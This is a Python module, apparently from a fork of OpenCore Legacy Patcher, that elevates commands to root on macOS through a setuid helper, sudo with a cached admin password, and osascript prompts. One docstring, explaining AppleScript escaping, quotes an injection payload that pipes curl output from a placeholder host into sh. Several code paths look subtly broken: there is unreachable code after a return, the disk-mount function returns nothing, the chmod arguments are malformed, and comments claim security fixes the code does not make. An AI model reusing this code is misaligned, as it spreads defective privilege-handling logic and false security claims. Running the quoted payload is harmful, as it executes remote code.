"""
subprocess_wrapper.py: Wrapper for subprocess module to better handle errors and output
                       Additionally handles our Privileged Helper Tool
"""

import enum
import stat
import shlex
import logging
import subprocess
import os
import atexit
import threading
from . import utilities

from pathlib import Path
from typing import Callable, Optional


OCLP_PRIVILEGED_HELPER = "/Library/PrivilegedHelperTools/com.albert-mueller.opencore-patcher-t2.privileged-helper"
OCLP_PRIVILEGED_HELPER_EXPECTED_MODE = 0o4755

ADMIN_PASSWORD_PROMPT_MESSAGE = (
    "OpenCore Legacy Patcher needs your administrator password to apply root patches. "
    "You will only be asked once - it is kept in memory until the app quits."
)
ADMIN_PASSWORD_RETRY_MESSAGE = "Incorrect password, please try again. " + ADMIN_PASSWORD_PROMPT_MESSAGE
ADMIN_PROMPT_MAX_ATTEMPTS = 3

# Session-wide administrator credential cache (Issue #356).
#
# Without it every privileged operation that could not go through the Privileged Helper
# Tool - which is every one of them on an unsigned/ad-hoc build, since the helper refuses
# callers without a matching certificate chain - spawned its own
# 'osascript ... with administrator privileges'. AppleScript only caches that
# authorization inside the process that asked for it, and each osascript call is a new
# process, so root patching asked for the password again for nearly every command, plus
# once more for the disk image mounts.
#
# The password is kept in process memory only, never written anywhere, never logged,
# and dropped at exit. Python strings cannot be reliably wiped, so this is a
# convenience/exposure trade-off, not a secure-memory guarantee; the process already
# held the password transiently for the sudo-based DMG mounts before this change.
_admin_session_lock = threading.RLock()
_cached_admin_password: Optional[str] = None
_admin_prompt_icon_path = None
# Set once the helper has reported a non-transient failure (signing/certificates), so we
# stop invoking it for every single command of the session.
_privileged_helper_unusable = False
# True when the last password request was cancelled by the user
_admin_password_cancelled = False
# True once sudo rejected every attempt (e.g. the account is not an administrator);
# later commands then go straight to osascript instead of re-running the dialog loop.
_sudo_elevation_failed = False


class PrivilegedHelperErrorCodes(enum.IntEnum):
    """
    Error codes for Privileged Helper Tool.

    Reference:
        payloads/Tools/PrivilegedHelperTool/main.m
    """
    OCLP_PHT_ERROR_MISSING_ARGUMENTS           = 160
    OCLP_PHT_ERROR_SET_UID_MISSING             = 161
    OCLP_PHT_ERROR_SET_UID_FAILED              = 162
    OCLP_PHT_ERROR_SELF_PATH_MISSING           = 163
    OCLP_PHT_ERROR_PARENT_PATH_MISSING         = 164
    OCLP_PHT_ERROR_SIGNING_INFORMATION_MISSING = 165
    OCLP_PHT_ERROR_INVALID_TEAM_ID             = 166
    OCLP_PHT_ERROR_INVALID_CERTIFICATES        = 167
    OCLP_PHT_ERROR_COMMAND_MISSING             = 168
    OCLP_PHT_ERROR_COMMAND_FAILED              = 169
    OCLP_PHT_ERROR_CATCH_ALL                   = 170
    OCLP_PHT_ERROR_COMMAND_NOT_ALLOWED         = 171


# Errors that will not go away by retrying within this session: the helper (or the app
# calling it) simply is not signed in a way the helper accepts.
_HELPER_PERMANENT_ERRORS = (
    PrivilegedHelperErrorCodes.OCLP_PHT_ERROR_SIGNING_INFORMATION_MISSING.value,
    PrivilegedHelperErrorCodes.OCLP_PHT_ERROR_INVALID_TEAM_ID.value,
    PrivilegedHelperErrorCodes.OCLP_PHT_ERROR_INVALID_CERTIFICATES.value,
)


def _helper_path_is_safe_to_repair() -> bool:
    """
    Validate that OCLP_PRIVILEGED_HELPER is a plausible, untampered helper binary
    before we consider handing it setuid-root.

    This matters because repair_privileged_helper_permissions() ultimately runs
    'chmod 4755 <path>' AS ROOT. chmod(1), Path.exists() and Path.stat() all follow
    symlinks, so without these checks anyone able to replace that path with a symlink
    could have us mark an arbitrary root-owned binary setuid-root - a local privilege
    escalation, using an authorization prompt the user has every reason to approve.

    A helper that has lost its setuid bit is itself a possible sign of tampering, so
    "unexpected permissions" is treated as a reason to look harder, not as routine drift.

    Checks (all must hold):
      - the path is a regular file and NOT a symlink (lstat, so we inspect the link itself)
      - it is owned by root
      - its parent directory is owned by root and is not group- or world-writable

    Deliberately does NOT enforce a code-signature/Team ID check: this fork intentionally
    runs an unsigned helper, so codesign verification would fail by design here. That means
    these checks are a floor, not a guarantee - they stop the symlink/permission tricks a
    non-root local attacker can play, not a compromise that already has root.

    Returns:
        bool: True if the helper looks like our binary in its expected location.
    """
    helper_path = Path(OCLP_PRIVILEGED_HELPER)

    try:
        # lstat(), NOT stat(): we want to inspect the path itself, not its symlink target
        helper_stat = helper_path.lstat()
        parent_stat = helper_path.parent.lstat()
    except OSError as error:
        logging.error(f"Could not stat Privileged Helper Tool: {error}")
        return False
    except Exception as e: # behebt eine Sicherheitslücke, die erlaubt Angreifern, den Priveleged Helper Tool einen unerwartetes Fehler auszulösen, um beliebiges Code auszuführen
        logging.error(f"Could not stat Privileged Helper Tool due to unexpected error: {e}")
        logging.exception("Stack Trace:")
        return False

    if stat.S_ISLNK(helper_stat.st_mode):
        logging.error("Privileged Helper Tool is a symlink - refusing to repair permissions")
        return False

    if not stat.S_ISREG(helper_stat.st_mode):
        logging.error("Privileged Helper Tool is not a regular file - refusing to repair permissions")
        return False

    if helper_stat.st_uid != 0:
        logging.error(f"Privileged Helper Tool is not owned by root (uid {helper_stat.st_uid}) - refusing to repair permissions")
        return False

    if parent_stat.st_uid != 0:
        logging.error(f"Privileged Helper Tool's directory is not owned by root (uid {parent_stat.st_uid}) - refusing to repair permissions")
        return False

    if stat.S_IMODE(parent_stat.st_mode) & (stat.S_IWGRP | stat.S_IWOTH):
        logging.error("Privileged Helper Tool's directory is group- or world-writable - refusing to repair permissions")
        return False

    return True


def privileged_helper_needs_setuid_repair() -> bool:
    """
    Check whether the Privileged Helper Tool is missing its expected
    permission bits (4755: setuid root, rwxr-xr-x).

    This can drift after certain OS updates or re-signing steps, and
    manifests as OCLP_PHT_ERROR_SET_UID_MISSING/FAILED when the helper
    is invoked.

    Returns:
        bool: True if the helper tool exists, passes the safety checks in
              _helper_path_is_safe_to_repair(), and its permissions need to be
              repaired. False if it's already correct, isn't installed yet
              (nothing to repair here), or failed validation.
    """
    helper_path = Path(OCLP_PRIVILEGED_HELPER)
    if not helper_path.exists():
        return False

    current_mode = stat.S_IMODE(helper_path.lstat().st_mode)
    if current_mode == OCLP_PRIVILEGED_HELPER_EXPECTED_MODE:
        return False

    logging.info(f"Privileged Helper Tool has unexpected permissions: {oct(current_mode)} (expected {oct(OCLP_PRIVILEGED_HELPER_EXPECTED_MODE)})")

    # Only now, once we know we would actually chmod something, pay for the validation
    if _helper_path_is_safe_to_repair():
        return True
    elif not _helper_path_is_safe_to_repair(): # behebt eine Sicherheitslücke, die erlaubt Angreifern, Root-Rechte zu erhalten
        return False
    else:
        logging.error("We failed to assess the safety of repairing the Priveleged Helper Tool. It won't be repaired, just to be on the safe side.")
        logging.info("Please ensure that OpenCore Legacy Patcher T2 is downloaded only from the official GitHub repository.")
        return False


def repair_privileged_helper_permissions():

        if not _helper_path_is_safe_to_repair():
            return False

        prompt = "OpenCore Legacy Patcher T2 needs administrator permission to repair the permissions of its privileged helper tool."

        result=utilities.get_admin_permission(
            action="/bin/chmod", 
            args=[f"{oct(OCLP_PRIVILEGED_HELPER_EXPECTED_MODE)[2:]} {OCLP_PRIVILEGED_HELPER}".encode("utf-8")],
            reason=prompt,
            # the defaults for the buttons are ok, so we would touch them
        )
        if result.returncode == 0:
            return True
        else:
            return False




def run(*args, **kwargs):
    """
    Basic subprocess.run wrapper.
    """
    return subprocess.run(*args, **kwargs)


def run_as_root(*args, **kwargs):
    """
    Run subprocess as root.

    Note: Full path to first argument is required.
    Helper tool does not resolve PATH.

    Always returns a CompletedProcess - callers (notably run_as_root_and_verify()
    and verify()) dereference .returncode unconditionally, so returning None here
    would turn a handled failure into an AttributeError.
    """
    # Check if first argument exists
    if not Path(args[0][0]).exists():
        raise FileNotFoundError(f"File not found: {args[0][0]}")

    _command = list(args[0])

    # If we are already running as root (e.g. launched via sudo), bypass the Helper Tool
    if os.geteuid() == 0:
        return subprocess.run(_command, **kwargs)

    global _privileged_helper_unusable

    if Path(OCLP_PRIVILEGED_HELPER).exists() and not _privileged_helper_unusable:
        if privileged_helper_needs_setuid_repair():
            if not repair_privileged_helper_permissions():
                logging.error("Privileged Helper Tool permissions could not be repaired, cannot complete request.")
                # Deliberately no osascript fallback here: the helper being in an
                # unexpected state is exactly when a silent downgrade to an
                # administrator-password prompt is least appropriate, since that
                # prompt is indistinguishable from one an attacker could provoke.
                return subprocess.CompletedProcess(
                    args=_command,
                    returncode=PrivilegedHelperErrorCodes.OCLP_PHT_ERROR_SET_UID_FAILED.value,
                    stdout=b"",
                    stderr=b"Privileged Helper Tool permissions could not be repaired",
                )
        result = subprocess.run([OCLP_PRIVILEGED_HELPER] + _command, **kwargs)
        # Any of our own PrivilegedHelperErrorCodes sentinel values (160-170) means the helper
        # tool itself couldn't do its job - an escalation failure (eg. missing/invalid setuid bit)
        # or another internal precondition (signing/certificates/command validation) - as opposed
        # to the wrapped command failing on its own merits with an ordinary low exit code, which is
        # just returned as-is: retrying that via osascript wouldn't fix a genuine command failure,
        # and would only cost an extra administrator-password prompt for nothing.
        _helper_error = __resolve_privileged_helper_errors(result.returncode)
        if _helper_error is None:
            return result
        if result.returncode in _HELPER_PERMANENT_ERRORS:
            _privileged_helper_unusable = True
            logging.error(f"Privileged Helper Tool rejected this build ({_helper_error}), not using it for the rest of this session.")
        else:
            logging.error(f"Privileged Helper Tool failed ({_helper_error}).")
    elif not Path(OCLP_PRIVILEGED_HELPER).exists():
        logging.warning(f"Privileged Helper Tool not found at {OCLP_PRIVILEGED_HELPER}.")
    process =_command[0]
    _command.remove(process)
    return utilities.get_admin_permission(action=process, args=_command)

    return _run_elevated_without_helper(_command, **kwargs)


def _run_elevated_without_helper(command: list, **kwargs) -> subprocess.CompletedProcess:
    """
    Elevate a command when the Privileged Helper Tool cannot be used.

    Prefers sudo fed from the session credential cache, so the user is asked for the
    administrator password once per session rather than once per command (Issue #356).
    Only if no usable password could be obtained that way - e.g. the account is not in
    sudoers, or the plain password dialog could not be shown - does it fall back to
    osascript, whose native prompt also accepts a different administrator's name.
    """
    password = obtain_admin_password()
    if password is None:
        if _admin_password_cancelled:
            logging.info("Administrator password prompt cancelled, not running privileged command")
            return subprocess.CompletedProcess(args=command, returncode=1, stdout=b"", stderr=b"User cancelled administrator authentication")
        logging.warning("No usable administrator password for sudo, falling back to osascript")
        return osascript(command, **kwargs)
    return _run_with_sudo(command, password, **kwargs)


def _run_with_sudo(command: list, password: str, **kwargs) -> subprocess.CompletedProcess:
    """
    Run 'command' through 'sudo -S', supplying the cached password on stdin.

    '-k' makes sudo ignore any timestamp, so it always consumes exactly the one password
    line we send (or none, when sudoers says NOPASSWD and 'password' is ""), and '-p ""'
    keeps its prompt out of the command's stderr. The command itself then sees EOF on
    stdin, which matches what it got from the helper/osascript paths.
    """
    if "input" in kwargs or "stdin" in kwargs:
        # Would collide with the password line; no current caller does this.
        raise ValueError("run_as_root() does not support stdin/input when elevating via sudo")

    payload = (password + "\n") if password else ""
    text_mode = bool(kwargs.get("text") or kwargs.get("universal_newlines") or kwargs.get("encoding") or kwargs.get("errors"))
    sudo_input = payload if text_mode else payload.encode()

    result = subprocess.run(
        ["/usr/bin/sudo", "-S", "-k", "-p", "", "--"] + [str(arg) for arg in command],
        input=sudo_input,
        **kwargs
    )
    # Report the command as the caller wrote it, not the sudo wrapper (keeps logs readable
    # and never includes anything password-related).
    result.args = command
    return result


def _admin_password_is_valid(password: str) -> bool:
    """Check a password against sudo without running anything ('sudo -v')."""
    try:
        result = subprocess.run(
            ["/usr/bin/sudo", "-S", "-k", "-p", "", "-v"],
            input=(password + "\n").encode(),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30
        )
    except Exception as error:
        logging.error(f"Could not validate administrator password: {error}")
        return False
    return result.returncode == 0


def set_admin_prompt_icon(icon_path) -> None:
    """Icon used by the session's administrator password dialog."""
    global _admin_prompt_icon_path
    if icon_path:
        _admin_prompt_icon_path = icon_path


def obtain_admin_password(admin_password_prompt: Optional[Callable[..., str]] = None) -> Optional[str]:
    """
    Return an administrator password usable with 'sudo -S', asking at most once per session.

    Returns:
        str:  the validated password, or "" if sudo does not need one (NOPASSWD).
        None: none available - the user cancelled (see _admin_password_cancelled) or
              every attempt failed validation / the dialog could not be shown.

    'admin_password_prompt' lets callers supply their own dialog; it is called with a
    'message' keyword argument and returns the entered password ("" on cancel). Only a password sudo accepted is cached, so a
    typo is re-asked right away instead of failing every later command.
    """
    global _cached_admin_password, _admin_password_cancelled, _sudo_elevation_failed

    with _admin_session_lock:
        if _cached_admin_password is not None:
            return _cached_admin_password

        if _sudo_elevation_failed:
            _admin_password_cancelled = False
            return None

        if not _sudo_will_prompt():
            _cached_admin_password = ""
            return _cached_admin_password

        for attempt in range(ADMIN_PROMPT_MAX_ATTEMPTS):
            message = ADMIN_PASSWORD_PROMPT_MESSAGE if attempt == 0 else ADMIN_PASSWORD_RETRY_MESSAGE
            if admin_password_prompt is None:
                password = request_admin_password(_admin_prompt_icon_path, message=message)
            else:
                password = admin_password_prompt(message=message)

            if not password:
                _admin_password_cancelled = True
                return None

            if _admin_password_is_valid(password):
                _admin_password_cancelled = False
                _cached_admin_password = password
                logging.info("Administrator password accepted, reusing it for this session")
                return _cached_admin_password

            logging.info(f"Administrator password rejected by sudo (attempt {attempt + 1}/{ADMIN_PROMPT_MAX_ATTEMPTS})")

        _admin_password_cancelled = False
        _sudo_elevation_failed = True
        return None


def clear_cached_admin_password() -> None:
    """Forget the session's administrator password."""
    global _cached_admin_password, _admin_password_cancelled, _sudo_elevation_failed
    with _admin_session_lock:
        _cached_admin_password = None
        _admin_password_cancelled = False
        _sudo_elevation_failed = False


atexit.register(clear_cached_admin_password)


def osascript(cmd_args, **kwargs) -> subprocess.CompletedProcess:
    """
    Elevate via AppleScript's "do shell script ... with administrator privileges".

    Nur als Fallback gedacht: dieser Pfad fragt den Benutzer nach einem Admin-Passwort,
    statt den Helper zu benutzen. Ein Angreifer, der den Helper unbrauchbar macht
    (loeschen, Rechte zerstoeren), kann OCLP damit in diesen Pfad zwingen und dem
    Benutzer einen erwarteten Passwort-Prompt praesentieren - das ist eine
    Phishing-Oberflaeche, keine Codeausfuehrung. Deshalb wird oben beim
    fehlgeschlagenen Repair bewusst NICHT hierher zurueckgefallen.

    Der Parametername ist 'cmd_args' und nicht 'args': die urspruengliche Fassung
    referenzierte ein nicht existierendes 'args' und loeste NameError aus.
    """
    cmd_string = shlex.join(str(arg) for arg in cmd_args)
    # Newlines cannot appear inside an AppleScript string literal at all, so a command
    # containing them is rejected outright rather than producing a syntactically broken
    # script. Everything else is escaped by applescript_quote() below.
    if "\n" in cmd_string or "\r" in cmd_string:
        raise ValueError("Refusing to build AppleScript from a command containing newlines")
    apple_script = f'do shell script "{applescript_quote(cmd_string)}" with administrator privileges'
    return subprocess.run(["/usr/bin/osascript", "-e", apple_script], **kwargs)


def applescript_quote(value) -> str:
    """
    Escape a value for interpolation into an AppleScript string literal.

    AppleScript is compiled, not handed to a shell, so passing the script through
    osascript -e argv (or py-applescript) does NOT protect against a value that
    contains a double quote: the quote closes the literal and everything after it
    is parsed as code. A value such as

        1.0" & (do shell script "curl http://host/x | sh") & "

    turns a 'display dialog' into arbitrary command execution. Every value that is
    interpolated into an AppleScript source string must go through here first.

    Backslashes are escaped before quotes (order matters, or the escape character
    itself gets doubled twice), and CR/LF become the AppleScript escape sequences,
    since a raw newline cannot appear inside an AppleScript string literal.

    Parameters:
        value: Value to escape. Cast to str, so None/int callers are safe.

    Returns:
        str: The escaped text, without the surrounding quotes.
    """
    text = str(value)
    text = text.replace("\\", "\\\\").replace('"', '\\"')
    text = text.replace("\r", "\\r").replace("\n", "\\n")
    return text


def applescript_icon_clause(icon_path) -> str:
    """
    Build the 'with icon POSIX file "..."' fragment for a 'display dialog' call.

    Two things this deliberately does NOT do, both of which used to break dialogs:

      1. It does not hand AppleScript an HFS path. The previous form,
         str(icon_path).replace("/", ":")[1:], produced "Users:me:...icns" - an HFS
         path whose first component is read as the VOLUME name, so it resolved
         against a non-existent volume "Users". 'with icon POSIX file "/Users/..."'
         takes the POSIX path as-is.
      2. It does not reference a file that isn't there. A missing icon makes
         'display dialog' raise, and every caller here wraps that in a try/except -
         so a cosmetic problem silently swallows the whole dialog. Where that dialog
         is how we collect an administrator password, the result is a mount that
         fails with no prompt ever shown. Returning an empty clause loses the icon
         and keeps the dialog.

    Returns:
        str: the clause including its leading space, or "" if no usable icon exists.
    """
    try:
        path = Path(icon_path)
        if not path.is_file():
            logging.warning(f"Dialog icon missing, continuing without it: {path}")
            return ""
    except Exception:
        return ""

    # A quote or backslash would break out of the AppleScript string literal.
    # Nothing in our own bundle contains either; drop the icon rather than
    # building a script we cannot escape correctly.
    if '"' in str(path) or "\\" in str(path):
        logging.warning("Dialog icon path contains characters that cannot be quoted, continuing without it")
        return ""

    return f' with icon POSIX file "{path}"'


def request_admin_password(icon_path=None, message: str = ADMIN_PASSWORD_PROMPT_MESSAGE) -> str:
    """
    Prompt for the local administrator password via a plain dialog.

    Deliberately NOT routed through "do shell script ... with administrator
    privileges": that mechanism runs the elevated command via
    /usr/libexec/security_authtrampoline, a process detached from the current
    login/Aqua session. hdiutil's own internal authentication (DIHelperAgentMaster)
    appears to depend on that session being present, so a hdiutil invocation
    elevated via the trampoline can fail with "hdiutil: attach failed -
    Authentication error" even though the same command run under sudo from a
    session-bound process succeeds. A plain "display dialog" only needs a
    WindowServer session to render, so we use it purely to collect the password
    and feed it to sudo ourselves.

    A failure to even show the dialog is logged rather than swallowed: silently
    returning "" here reads downstream as "user cancelled" and aborts elevation,
    which previously turned any dialog problem into an unexplained mount failure.

    Returns:
        str: the password, or "" if cancelled or the dialog could not be shown.
    """
    import applescript

    script = (
        f'set theResult to display dialog "{applescript_quote(message)}" default answer "" with hidden answer '
        f'with title "OpenCore Legacy Patcher"{applescript_icon_clause(icon_path)}\n'
        'return the text returned of theResult'
    )

    try:
        return applescript.AppleScript(script).run() or ""
    except Exception as error:
        # -128 is AppleScript's "User canceled" - expected, not a fault.
        if "-128" in str(error):
            logging.info("Administrator password prompt cancelled by user")
        else:
            logging.error(f"Failed to display administrator password prompt: {error}")
        return ""


def _sudo_will_prompt() -> bool:
    """
    Whether 'sudo -k' would actually ask for a password on this machine.

    Matters because mount_dmg() feeds sudo and hdiutil from the same stdin: the
    first line is consumed by sudo's prompt, the rest is handed to hdiutil's
    -stdinpass. If sudo does not prompt (a NOPASSWD sudoers rule - which '-k' does
    NOT override, it only clears the credential timestamp), that first line falls
    through to hdiutil and is tried as the image passphrase, producing an
    authentication failure that looks nothing like its actual cause.

    Returns:
        bool: True if a password line should be sent, False if sudo runs unprompted.
    """
    try:
        result = subprocess.run(
            ["/usr/bin/sudo", "-k", "-n", "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=15
        )
    except Exception:
        # Assume a prompt: sending a password line sudo did not want is recoverable
        # via the caller's retry, withholding one it did want hangs on EOF.
        return True
    return result.returncode != 0


def mount_dmg(
    dmg_path: Path,
    mount_point: Path,
    shadow_path: Path = None,
    password: str = None,
    admin_password_prompt: Optional[Callable[[], str]] = None,
    retry_on_auth_error: bool = False
) -> subprocess.CompletedProcess:
    """
    Attach a disk image via 'hdiutil attach', using '-stdinpass' rather than
    the deprecated (and, on some systems, less reliable) '-passphrase' flag.

    Some systems (observed starting with macOS 26.4) require elevated
    privileges to mount disk images, a regression from prior unprivileged
    mounts succeeding, which manifests as "Permission denied". If
    'admin_password_prompt' is supplied and the unprivileged attempt fails
    with "Permission denied", this clears com.apple.quarantine (which can
    independently trip hdiutil's own Gatekeeper-style authentication gate)
    and retries once, elevated via 'sudo'.

    'retry_on_auth_error' additionally treats "Authentication error" as a
    retry trigger. Only pass this for a fixed, known-correct 'password' (e.g.
    PatcherSupportPkg's convention of a hardcoded passphrase): with a
    user-supplied password, "Authentication error" more likely means a wrong
    password than a privilege gate, and would otherwise wrongly prompt for an
    administrator password on every incorrect attempt.

    Deliberately not routed through "do shell script ... with administrator
    privileges" (security_authtrampoline): that mechanism runs detached from
    the current login/Aqua session, and hdiutil's own internal authentication
    appears to depend on that session being present. 'admin_password_prompt'
    is expected to only collect a password (e.g. via a plain AppleScript
    "display dialog"), not to perform the elevation itself.
    """
    mount_point.parent.mkdir(parents=True, exist_ok=True)

    cmd = ["/usr/bin/hdiutil", "attach", "-noverify", str(dmg_path), "-mountpoint", str(mount_point), "-nobrowse"]
    if shadow_path:
        shadow_path.parent.mkdir(parents=True, exist_ok=True)
        cmd.extend(["-shadow", str(shadow_path)])
    # Only ask hdiutil to read a passphrase from stdin when we actually have one;
    # passing -stdinpass with a closed stdin changes behaviour for unencrypted images
    # for no reason.
    if password:
        cmd.append("-stdinpass")

    # Force hdiutil and CoreFoundation to output in English so error matching is consistent.
    env = os.environ.copy()
    env["LC_ALL"] = "C"
    env["LANG"] = "en_US.UTF-8"
    env["AppleLanguages"] = '("en")'

    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    stdout, _ = process.communicate(input=password.encode() if password else None)

    if process.returncode == 0 or admin_password_prompt is None:
        return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)

    # Privilege error patterns across macOS versions / POSIX:
    _privilege_error = (
        b"Permission denied" in stdout
        or b"Operation not permitted" in stdout
        or b"not permitted" in stdout.lower()
    )
    _auth_error = retry_on_auth_error and b"Authentication error" in stdout

    # DiskImages / CoreFoundation localization may cause non-English error messages
    # on non-English installations. If unprivileged attach failed and we have an admin prompt,
    # retry with elevation rather than aborting due to language differences or unknown error strings.
    _should_retry = _privilege_error or _auth_error or retry_on_auth_error or (process.returncode != 0 and password is not None)
    if not _should_retry:
        return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)

    logging.info("- Unprivileged hdiutil attach failed, retrying with administrator privileges")
    action = cmd[0]
    cmd.remove(action)
    utilities.get_admin_permission(action=action, args=cmd, reason=admin_password_prompt)


def verify(process_result: subprocess.CompletedProcess) -> None:
    """
    Verify process result and raise exception if failed.
    """
    if process_result.returncode == 0:
        return

    # Ohne das Logging hier bemerkt ein Benutzer ausserhalb der GUI einen Fehlschlag
    # nur an der Exception, ohne Kommando, Exit-Code oder Ausgabe.
    logging.error(f"Process failed with exit code {process_result.returncode}")
    log(process_result)
    raise Exception(f"Process failed with exit code {process_result.returncode}")


def run_and_verify(*args, **kwargs) -> None:
    """
    Run subprocess and verify result.

    Asserts on failure.
    """
    verify(run(*args, **kwargs))


def run_as_root_and_verify(*args, **kwargs) -> None:
    """
    Run subprocess as root and verify result.

    Asserts on failure.
    """
    verify(run_as_root(*args, **kwargs))


def log(process: subprocess.CompletedProcess) -> None:
    """
    Display subprocess error output in formatted string.
    """
    for line in generate_log(process).split("\n"):
        logging.error(line)


def generate_log(process: subprocess.CompletedProcess) -> str:
    """
    Display subprocess error output in formatted string.
    Note this function is still used for zero return code errors, since
    some software don't ever return non-zero regardless of success.

    Format:

        Command: <command>
        Return Code: <return code>
        Standard Output:
            <standard output line 1>
            <standard output line 2>
            ...
        Standard Error:
            <standard error line 1>
            <standard error line 2>
            ...
    """
    output = "Subprocess failed.\n"
    output += f"    Command: {process.args}\n"
    output += f"    Return Code: {process.returncode}\n"
    _returned_error = __resolve_privileged_helper_errors(process.returncode)
    if _returned_error:
        output += f"        Likely Enum: {_returned_error}\n"
    output += f"    Standard Output:\n"
    if process.stdout:
        output += __format_output(process.stdout.decode("utf-8"))
    else:
        output += "        None\n"
    output += f"    Standard Error:\n"
    if process.stderr:
        output += __format_output(process.stderr.decode("utf-8"))
    else:
        output += "        None\n"

    return output


def __resolve_privileged_helper_errors(return_code: int) -> Optional[str]:
    """
    Attempt to resolve Privileged Helper Tool error codes.

    Returns the enum name for one of our sentinel codes (160-171), or None for any
    other exit code - callers distinguish "the helper itself failed" from "the wrapped
    command failed" on exactly this None check.
    """
    if return_code not in [error_code.value for error_code in PrivilegedHelperErrorCodes]:
        return None

    return PrivilegedHelperErrorCodes(return_code).name


def __format_output(output: str) -> str:
    """
    Format output.
    """
    if not output:
        # Shouldn't happen, but just in case
        return "        None\n"

    _result = "\n".join([f"        {line}" for line in output.split("\n") if line not in ["", "\n"]])
    if not _result.endswith("\n"):
        _result += "\n"

    return _result
